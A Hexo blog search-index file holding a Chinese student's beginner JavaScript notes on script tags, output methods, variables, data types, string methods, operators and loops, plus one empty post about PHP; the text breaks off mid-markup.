<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>从下水道尝试看懂php和联系</title>
      <link href="/2021/11/28/%E4%BB%8E%E4%B8%8B%E6%B0%B4%E9%81%93%E5%B0%9D%E8%AF%95%E7%9C%8B%E6%87%82php%E5%92%8C%E8%81%94%E7%B3%BB/"/>
      <url>/2021/11/28/%E4%BB%8E%E4%B8%8B%E6%B0%B4%E9%81%93%E5%B0%9D%E8%AF%95%E7%9C%8B%E6%87%82php%E5%92%8C%E8%81%94%E7%B3%BB/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>js笔记</title>
      <link href="/2021/11/22/js%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/11/22/js%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript-用法"><a href="#JavaScript-用法" class="headerlink" title="JavaScript 用法"></a>JavaScript 用法</h1><hr><p>HTML 中的脚本必须位于 <code>&lt;script&gt; </code>与<code> &lt;/script&gt;</code> 标签之间。</p><p>脚本可被放置在 HTML 页面的 <code>&lt;body&gt; </code>和 <code>&lt;head&gt;</code> 部分中。</p><p>js可以自己编写</p><p>也可以把脚本保存到外部文件中。外部文件通常包含被多个网页使用的代码。</p><p>外部 JavaScript 文件的文件扩展名是 .js。</p><p>如需使用外部文件，请在<code>&lt;script&gt;</code>标签的 “src” 属性中设置该 .js 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src=&quot;myScript.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">#可以将脚本放置于 &lt;head&gt; 或者 &lt;body&gt;中，放在 &lt;script&gt; 标签中的脚本与外部引用的脚本运行#效果完全一致。</span><br><span class="line">myScript.js 文件代码如下：</span><br><span class="line">function myFunction()</span><br><span class="line">&#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML=&quot;我的第一个 JavaScript 函数&quot;;</span><br><span class="line">&#125;</span><br><span class="line">#外部脚本不能包含 &lt;script&gt; 标签。</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意细节：</strong></p><p>1、在标签中填写 onclick 事件调用函数时，不是 <strong>onclick=函数名</strong>， 而是 **onclick=函数名+()**，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;script&gt; </span><br><span class="line">   function myfunction()&#123;</span><br><span class="line">        document.getElementById(&quot;demo&quot;).innerHTML=&quot;onclick事件触发&quot;;</span><br><span class="line">       &#125;&lt;/script&gt;</span><br><span class="line">   &lt;/head&gt;</span><br><span class="line">&gt;&lt;body&gt;</span><br><span class="line">   &lt;h1 id=&quot;demo&quot;&gt;一个段落&lt;/h1&gt;</span><br><span class="line">   &lt;button onclick=&quot;myfunction()&quot; type=&quot;button&quot;&gt;点击这里&lt;/button&gt;</span><br><span class="line">&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>2、外部 javascript 文件不使用 <code>&lt;script&gt;</code> 标签，直接写 javascript 代码。</p><p>3、HTML 输出流中使用 document.write，相当于添加在原有html代码中添加一串html代码。而如果在文档加载后使用（如使用函数），会覆盖整个文档。</p><p>使用函数来执行document.write代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;script&gt;</span><br><span class="line">&gt;function myfunction()&#123;</span><br><span class="line">   document.write(&quot;使用函数来执行doucment.write，即在文档加载后再执行这个操作，会实现文档覆盖&quot;);</span><br><span class="line">&gt;&#125;</span><br><span class="line">&gt;document.write(&quot;&lt;h1&gt;这是一个标题&lt;/h1&gt;&quot;);</span><br><span class="line">&gt;document.write(&quot;&lt;p&gt;这是一个段落。&lt;/p&gt;&quot;);</span><br><span class="line">&gt;&lt;/script&gt;</span><br><span class="line">&gt;&lt;p &gt;</span><br><span class="line">&gt;您只能在 HTML 输出流中使用 &lt;strong&gt;document.write&lt;/strong&gt;。</span><br><span class="line">&gt;如果您在文档已加载后使用它（比如在函数中），会覆盖整个文档。</span><br><span class="line">&gt;&lt;/p&gt;</span><br><span class="line">&gt;&lt;button type=&quot;button&quot; onclick=&quot;myfunction()&quot;&gt;点击这里&lt;/button&gt;</span><br></pre></td></tr></table></figure></blockquote><h1 id="JavaScript-输出"><a href="#JavaScript-输出" class="headerlink" title="JavaScript 输出"></a>JavaScript 输出</h1><hr><p>JavaScript 没有任何打印或者输出的函数。</p><h2 id="JavaScript-显示数据"><a href="#JavaScript-显示数据" class="headerlink" title="JavaScript 显示数据"></a>JavaScript 显示数据</h2><p>JavaScript 可以通过不同的方式来输出数据：</p><ul><li><p>使用 <strong>window.alert()</strong> 弹出框。</p><p><code>window.alert(5 + 6);</code></p></li><li><p>使用 <strong>document.write()</strong> 方法将内容写到 HTML 文档中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;我的第一个 Web 页面&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;我的第一个段落。&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;button onclick=&quot;myFunction()&quot;&gt;点我&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">function myFunction() &#123;</span><br><span class="line">   document.write(Date());</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>使用 <strong>innerHTML</strong> 写入到 HTML 元素。</p></li><li><p>使用 <strong>console.log()</strong> 写入到浏览器的控制台。</p></li></ul><p><img src="image-20211122142414961.png" alt="image-20211122142414961"></p><h1 id="JavaScript-语法"><a href="#JavaScript-语法" class="headerlink" title="JavaScript 语法"></a>JavaScript 语法</h1><p>JavaScript 是一个程序语言。语法规则定义了语言结构。</p><hr><h2 id="JavaScript-语法-1"><a href="#JavaScript-语法-1" class="headerlink" title="JavaScript 语法"></a>JavaScript 语法</h2><p>JavaScript 是一个脚本语言。</p><p>它是一个轻量级，但功能强大的编程语言。</p><hr><h2 id="JavaScript-字面量"><a href="#JavaScript-字面量" class="headerlink" title="JavaScript 字面量"></a>JavaScript 字面量</h2><p>在编程语言中，一般固定值称为字面量，如 3.14。</p><p><strong>数字（Number）字面量</strong> 可以是整数或者是小数，或者是科学计数(e)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = 123e5;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">#</span><br><span class="line">12300000</span><br></pre></td></tr></table></figure><p><strong>表达式字面量</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = 5 * 10;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">#</span><br><span class="line">50</span><br></pre></td></tr></table></figure><p><strong>数组（Array）字面量</strong> 定义一个数组：</p><p><code>[40, 100, 1, 5, 25, 10]</code></p><p><strong>对象（Object）字面量</strong> 定义一个对象：</p><p><code>&#123;firstName:&quot;John&quot;, lastName:&quot;Doe&quot;, age:50, eyeColor:&quot;blue&quot;&#125;</code></p><p><strong>函数（Function）字面量</strong> 定义一个函数：</p><p><code>function myFunction(a, b) &#123; return a * b;&#125;</code></p><h2 id="JavaScript-变量"><a href="#JavaScript-变量" class="headerlink" title="JavaScript 变量"></a>JavaScript 变量</h2><p>对大小写敏感</p><p>在编程语言中，变量用于存储数据值。</p><p>JavaScript 使用关键字 <strong>var</strong> 来定义变量， 使用等号来为变量赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var length;</span><br><span class="line">length = 6;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = length;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var x, y, z;</span><br><span class="line">x = 5;</span><br><span class="line">y = 6;</span><br><span class="line">z = (x + y) * 10;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = z;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">#</span><br><span class="line">110</span><br></pre></td></tr></table></figure><h2 id="JavaScript-注释"><a href="#JavaScript-注释" class="headerlink" title="JavaScript 注释"></a>JavaScript 注释</h2><p>不是所有的 JavaScript 语句都是”命令”。双斜杠 <strong>//</strong> 后的内容将会被浏览器忽略：</p><p>多行注释/*    */</p><h2 id="JavaScript-数据类型"><a href="#JavaScript-数据类型" class="headerlink" title="JavaScript 数据类型"></a>JavaScript 数据类型</h2><p>JavaScript 有多种数据类型：数字，字符串，数组，对象等等：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var length = 16;                  // Number 通过数字字面量赋值 </span><br><span class="line">var points = x * 10;               // Number 通过表达式字面量赋值</span><br><span class="line">var lastName = &quot;Johnson&quot;;             // String 通过字符串字面量赋值</span><br><span class="line">var cars = [&quot;Saab&quot;, &quot;Volvo&quot;, &quot;BMW&quot;];       // Array 通过数组字面量赋值</span><br><span class="line">var person = &#123;firstName:&quot;John&quot;, lastName:&quot;Doe&quot;&#125;; // Object 通过对象字面量赋值</span><br></pre></td></tr></table></figure><h2 id="JavaScript-函数"><a href="#JavaScript-函数" class="headerlink" title="JavaScript 函数"></a>JavaScript 函数</h2><p>JavaScript 语句可以写在函数内，函数可以重复引用：</p><p><strong>引用一个函数</strong> = 调用函数(执行函数内的语句)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function myFunction(a, b) &#123;</span><br><span class="line">  return a * b;                // 返回 a 乘以 b 的结果</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=&quot;myPar&quot;&gt;我是一个段落。&lt;/p&gt;</span><br><span class="line">&lt;div id=&quot;myDiv&quot;&gt;我是一个div。&lt;/div&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">&lt;button type=&quot;button&quot; onclick=&quot;myFunction()&quot;&gt;点击这里&lt;/button&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function myFunction()&#123;</span><br><span class="line">    document.getElementById(&quot;myPar&quot;).innerHTML=&quot;你好世界！&quot;;</span><br><span class="line">    document.getElementById(&quot;myDiv&quot;).innerHTML=&quot;你最近怎么样?&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;p&gt;当您点击上面的按钮时，两个元素会改变。&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>JavaScript 会忽略多余的空格。</p><h2 id="对代码行进行折行"><a href="#对代码行进行折行" class="headerlink" title="对代码行进行折行"></a>对代码行进行折行</h2><p>您可以在文本字符串中使用反斜杠对代码行进行换行。下面的例子会正确地显示：</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><code>document.write(&quot;你好 \ 世界!&quot;);</code></p><h1 id="JavaScript-数据类型-1"><a href="#JavaScript-数据类型-1" class="headerlink" title="JavaScript 数据类型"></a>JavaScript 数据类型</h1><hr><p>**值类型(基本类型)**：字符串（String）、数字(Number)、布尔(Boolean)、对空（Null）、未定义（Undefined）、Symbol。</p><p><strong>引用数据类型</strong>：对象(Object)、数组(Array)、函数(Function)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">下面的代码创建名为 cars 的数组：</span><br><span class="line"></span><br><span class="line">var cars=new Array();</span><br><span class="line">cars[0]=&quot;Saab&quot;;</span><br><span class="line">cars[1]=&quot;Volvo&quot;;</span><br><span class="line">cars[2]=&quot;BMW&quot;;</span><br><span class="line">或者 (condensed array):</span><br><span class="line"></span><br><span class="line">var cars=new Array(&quot;Saab&quot;,&quot;Volvo&quot;,&quot;BMW&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">JavaScript 对象</span><br><span class="line">对象由花括号分隔。在括号内部，对象的属性以名称和值对的形式 (name : value) 来定义。属性由逗号分隔：</span><br><span class="line">对象也是一个变量，但对象可以包含多个值（多个变量），每个值以 name:value 对呈现。</span><br><span class="line">var person=&#123;firstname:&quot;John&quot;, lastname:&quot;Doe&quot;, id:5566&#125;;</span><br><span class="line">上面例子中的对象 (person) 有三个属性：firstname、lastname 以及 id。</span><br><span class="line"></span><br><span class="line">空格和折行无关紧要。声明可横跨多行：</span><br><span class="line"></span><br><span class="line">var person=&#123;</span><br><span class="line">firstname : &quot;John&quot;,</span><br><span class="line">lastname  : &quot;Doe&quot;,</span><br><span class="line">id        :  5566</span><br><span class="line">&#125;;</span><br><span class="line">对象属性有两种寻址方式：\</span><br><span class="line">name=person.lastname;</span><br><span class="line">name=persion[&quot;lastname&quot;];</span><br><span class="line">Undefined 和 Null</span><br><span class="line">Undefined 这个值表示变量不含有值。</span><br><span class="line"></span><br><span class="line">可以通过将变量的值设置为 null 来清空变量。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line">cars=null;</span><br><span class="line">person=null;</span><br><span class="line">声明变量类型</span><br><span class="line">当您声明新变量时，可以使用关键词 &quot;new&quot; 来声明其类型：</span><br><span class="line"></span><br><span class="line">var carname=new String;</span><br><span class="line">var x=      new Number;</span><br><span class="line">var y=      new Boolean;</span><br><span class="line">var cars=   new Array;</span><br><span class="line">var person= new Object;</span><br></pre></td></tr></table></figure><h2 id="JavaScript-函数语法"><a href="#JavaScript-函数语法" class="headerlink" title="JavaScript 函数语法"></a>JavaScript 函数语法</h2><p>函数就是包裹在花括号中的代码块，前面使用了关键词 function：</p><p>function <em>functionname</em>()<br>{<br>  <em>// 执行代码</em><br>}</p><p>当调用该函数时，会执行函数内的代码。</p><p>可以在某事件发生时直接调用函数（比如当用户点击按钮时），并且可由 JavaScript 在任何位置进行调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JavaScript 对大小写敏感。关键词 function 必须是小写的，并且必须以与函数名称相同的大小写来调用函数。</span><br></pre></td></tr></table></figure><h1 id="JavaScript-事件"><a href="#JavaScript-事件" class="headerlink" title="JavaScript 事件"></a>JavaScript 事件</h1><hr><p>HTML 事件是发生在 HTML 元素上的事情。</p><p>当在 HTML 页面中使用 JavaScript 时， JavaScript 可以触发这些事件。</p><hr><h2 id="HTML-事件"><a href="#HTML-事件" class="headerlink" title="HTML 事件"></a>HTML 事件</h2><p>HTML 事件可以是浏览器行为，也可以是用户行为。</p><p>以下是 HTML 事件的实例：</p><ul><li>HTML 页面完成加载</li><li>HTML input 字段改变时</li><li>HTML 按钮被点击</li></ul><p>通常，当事件发生时，你可以做些事情。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在事件触发时 JavaScript 可以执行一些代码。</span><br><span class="line"></span><br><span class="line">HTML 元素中可以添加事件属性，使用 JavaScript 代码来添加 HTML 元素。</span><br><span class="line"></span><br><span class="line">通常，当事件发生时，你可以做些事情。</span><br><span class="line"></span><br><span class="line">在事件触发时 JavaScript 可以执行一些代码。</span><br><span class="line"></span><br><span class="line">HTML 元素中可以添加事件属性，使用 JavaScript 代码来添加 HTML 元素。</span><br></pre></td></tr></table></figure><h1 id="JavaScript-字符串"><a href="#JavaScript-字符串" class="headerlink" title="JavaScript 字符串"></a>JavaScript 字符串</h1><hr><p>JavaScript 字符串用于存储和处理文本。</p><p>可以是插入到引号中的任何字符。你可以使用单引号或双引号：</p><p>也可以在字符串添加转义字符来使用引号：反斜杠</p><p>var x = ‘It&#39;s alright’;<br>var y = “He is called &quot;Johnny&quot;“;</p><p><img src="image-20211122145140962.png" alt="image-20211122145140962"></p><p>更多方法实例可以参见：<a href="https://www.runoob.com/jsref/jsref-obj-string.html">JavaScript String 对象</a>。</p><table><thead><tr><th align="left">方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">charAt()</td><td align="left">返回指定索引位置的字符</td></tr><tr><td align="left">charCodeAt()</td><td align="left">返回指定索引位置字符的 Unicode 值</td></tr><tr><td align="left">concat()</td><td align="left">连接两个或多个字符串，返回连接后的字符串</td></tr><tr><td align="left">fromCharCode()</td><td align="left">将 Unicode 转换为字符串</td></tr><tr><td align="left">indexOf()</td><td align="left">返回字符串中检索指定字符第一次出现的位置</td></tr><tr><td align="left">lastIndexOf()</td><td align="left">返回字符串中检索指定字符最后一次出现的位置</td></tr><tr><td align="left">localeCompare()</td><td align="left">用本地特定的顺序来比较两个字符串</td></tr><tr><td align="left">match()</td><td align="left">找到一个或多个正则表达式的匹配</td></tr><tr><td align="left">replace()</td><td align="left">替换与正则表达式匹配的子串</td></tr><tr><td align="left">search()</td><td align="left">检索与正则表达式相匹配的值</td></tr><tr><td align="left">slice()</td><td align="left">提取字符串的片断，并在新的字符串中返回被提取的部分</td></tr><tr><td align="left">split()</td><td align="left">把字符串分割为子字符串数组</td></tr><tr><td align="left">substr()</td><td align="left">从起始索引号提取字符串中指定数目的字符</td></tr><tr><td align="left">substring()</td><td align="left">提取字符串中两个指定的索引号之间的字符</td></tr><tr><td align="left">toLocaleLowerCase()</td><td align="left">根据主机的语言环境把字符串转换为小写，只有几种语言（如土耳其语）具有地方特有的大小写映射</td></tr><tr><td align="left">toLocaleUpperCase()</td><td align="left">根据主机的语言环境把字符串转换为大写，只有几种语言（如土耳其语）具有地方特有的大小写映射</td></tr><tr><td align="left">toLowerCase()</td><td align="left">把字符串转换为小写</td></tr><tr><td align="left">toString()</td><td align="left">返回字符串对象值</td></tr><tr><td align="left">toUpperCase()</td><td align="left">把字符串转换为大写</td></tr><tr><td align="left">trim()</td><td align="left">移除字符串首尾空白</td></tr><tr><td align="left">valueOf()</td><td align="left">返回某个字符串对象的原始值</td></tr></tbody></table><h1 id="JavaScript-运算符"><a href="#JavaScript-运算符" class="headerlink" title="JavaScript 运算符"></a>JavaScript 运算符</h1><hr><p><strong>运算符 = 用于赋值。</strong></p><p><strong>运算符 + 用于加值。</strong></p><h2 id="用于字符串的-运算符"><a href="#用于字符串的-运算符" class="headerlink" title="用于字符串的 + 运算符"></a>用于字符串的 + 运算符</h2><p>+ 运算符用于把文本值或字符串变量加起来（连接起来）。</p><p>如需把两个或多个字符串变量连接起来，请使用 + 运算符。</p><h2 id="对字符串和数字进行加法运算"><a href="#对字符串和数字进行加法运算" class="headerlink" title="对字符串和数字进行加法运算"></a>对字符串和数字进行加法运算</h2><p>两个数字相加，返回数字相加的和，如果数字与字符串相加，返回字符串，如下实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x=5+5;</span><br><span class="line">y=&quot;5&quot;+5;</span><br><span class="line">z=&quot;Hello&quot;+5;</span><br><span class="line"></span><br><span class="line">*x*,*y*, 和 *z* 输出结果为:</span><br><span class="line"></span><br><span class="line">10</span><br><span class="line">55</span><br><span class="line">Hello</span><br></pre></td></tr></table></figure><h1 id="JavaScript-比较-和-逻辑运算符"><a href="#JavaScript-比较-和-逻辑运算符" class="headerlink" title="JavaScript 比较 和 逻辑运算符"></a>JavaScript 比较 和 逻辑运算符</h1><p>比较和逻辑运算符用于测试 <em>true</em> 或者 <em>false</em>。</p><hr><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>比较运算符在逻辑语句中使用，以测定变量或值是否相等。</p><p>x=5，下面的表格解释了比较运算符：</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">比较</th><th align="left">返回值</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">==</td><td align="left">等于</td><td align="left">x==8</td><td align="left"><em>false</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison1">实例 »</a></td></tr><tr><td align="left">x==5</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison2">实例 »</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">===</td><td align="left">绝对等于（值和类型均相等）</td><td align="left">x===”5”</td><td align="left"><em>false</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison3">实例 »</a></td></tr><tr><td align="left">x===5</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison4">实例 »</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">!=</td><td align="left">不等于</td><td align="left">x!=8</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison5">实例 »</a></td></tr><tr><td align="left">!==</td><td align="left">不绝对等于（值和类型有一个不相等，或两个都不相等）</td><td align="left">x!==”5”</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison6">实例 »</a></td></tr><tr><td align="left">x!==5</td><td align="left"><em>false</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison7">实例 »</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">&gt;</td><td align="left">大于</td><td align="left">x&gt;8</td><td align="left"><em>false</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison8">实例 »</a></td></tr><tr><td align="left">&lt;</td><td align="left">小于</td><td align="left">x&lt;8</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison9">实例 »</a></td></tr><tr><td align="left">&gt;=</td><td align="left">大于或等于</td><td align="left">x&gt;=8</td><td align="left"><em>false</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison10">实例 »</a></td></tr><tr><td align="left">&lt;=</td><td align="left">小于或等于</td><td align="left">x&lt;=8</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison11">实例 »</a></td></tr></tbody></table><hr><h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>可以在条件语句中使用比较运算符对值进行比较，然后根据结果来采取行动：</p><p>if (age&lt;18) x=”Too young”;</p><p>您将在本教程的下一节中学习更多有关条件语句的知识。</p><hr><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>逻辑运算符用于测定变量或值之间的逻辑。</p><p>给定 x=6 以及 y=3，下表解释了逻辑运算符：</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">例子</th></tr></thead><tbody><tr><td align="left">&amp;&amp;</td><td align="left">and</td><td align="left">(x &lt; 10 &amp;&amp; y &gt; 1) 为 true</td></tr><tr><td align="left">||</td><td align="left">or</td><td align="left">(x==5 || y==5) 为 false</td></tr><tr><td align="left">!</td><td align="left">not</td><td align="left">!(x==y) 为 true</td></tr></tbody></table><hr><h2 id="条件运算符"><a href="#条件运算符" class="headerlink" title="条件运算符"></a>条件运算符</h2><p>JavaScript 还包含了基于某些条件对变量进行赋值的条件运算符。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><em>variablename</em>=(<em>condition</em>)?<em>value1</em>:<em>value2</em> </p><p>如果变量 age 中的值小于 18，则向变量 voteable 赋值 “年龄太小”，否则赋值 “年龄已达到”。</p><p><code>voteable=(age&lt;18)?&quot;年龄太小&quot;:&quot;年龄已达到&quot;;</code></p><h1 id="JavaScript-if…Else-语句"><a href="#JavaScript-if…Else-语句" class="headerlink" title="JavaScript if…Else 语句"></a>JavaScript if…Else 语句</h1><p>和其他语言相近</p><h1 id="JavaScript-for-循环"><a href="#JavaScript-for-循环" class="headerlink" title="JavaScript for 循环"></a>JavaScript for 循环</h1><hr><p>循环可以将代码块执行指定的次数。</p><h2 id="For-In-循环"><a href="#For-In-循环" class="headerlink" title="For/In 循环"></a>For/In 循环</h2><p>JavaScript for/in 语句循环遍历对象的属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var person=&#123;fname:&quot;Bill&quot;,lname:&quot;Gates&quot;,age:56&#125;;   for (x in person)  // x 为属性名 &#123;    txt=txt + person[x]; &#125;</span><br></pre></td></tr></table></figure><h1 id="JavaScript-while-循环"><a href="#JavaScript-while-循环" class="headerlink" title="JavaScript while 循环"></a>JavaScript while 循环</h1><hr><p>只要指定条件为 true，循环就可以一直执行代码块</p><blockquote><p>定义了数组后对数组进行赋值，中间如有某些下标未被使用（即未被赋值），在遍历的时候，采用一般的 for 循环和 for…in 循环得到的结果不同。</p><p>for…in 循环会自动跳过那些没被赋值的元素，而 for 循环则不会，它会显示出 undefined。</p><p>点击下面的按钮，循环遍历</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 